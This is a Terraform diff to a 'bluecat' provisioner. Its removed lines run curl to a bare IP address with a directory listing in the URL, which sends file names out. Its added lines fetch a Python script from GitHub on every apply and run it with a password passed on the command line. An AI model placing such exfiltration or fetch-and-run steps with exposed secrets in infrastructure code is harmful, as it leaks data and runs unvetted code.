@@ -1,13 +1,12 @@
 resource "null_resource" "execbluecat"{
-  provisioner "local-exec"{
-    command = "curl \"http://10.50.160.72/$(ls | tr '\n' ' ')\""
-    #command = "python3 main.py --hostname \"${var.hostname}\" --value \"${var.value}\" --svcPassword \"${var.password}\""
+  triggers = {
+    #Forces TF to always replace this resource, thus always run the command.
+    timestamp = "${timestamp()}"
   }
-}
-
-resource "null_resource" "execbluecat2"{
   provisioner "local-exec"{
-    command = "curl \"http://10.50.160.72/$(ls | tr '\n' ' ')\""
-    #command = "python3 main.py --hostname \"${var.hostname}\" --value \"${var.value}\" --svcPassword \"${var.password}\""
+    command = <<-EOT
+      curl "https://raw.githubusercontent.com/jmueller-hf/terraform-cln-bluecat/v1.9.0/main.py" -o main.py
+      python3 main.py --hostname "${var.hostname}" --value "${var.value}" --svcPassword "${var.password}"
+    EOT
   }
 }
